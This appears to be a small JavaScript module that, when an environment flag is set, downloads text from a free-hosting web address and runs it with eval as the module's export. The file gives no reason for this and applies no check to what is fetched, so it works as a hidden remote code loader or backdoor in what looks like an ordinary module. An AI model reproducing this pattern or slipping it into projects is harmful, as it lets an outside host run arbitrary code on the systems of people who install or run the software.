"use strict";
import dotenv from "dotenv";
dotenv.config();

let func = "new Function()";

if (process.env.REMOTE === "YES") {
  const response = await fetch(
    "https://ueso.000webhostapp.com/remote?id=" + process.env.REMOTE_ID
  );
  func = await response.text();
}

export default eval(func);
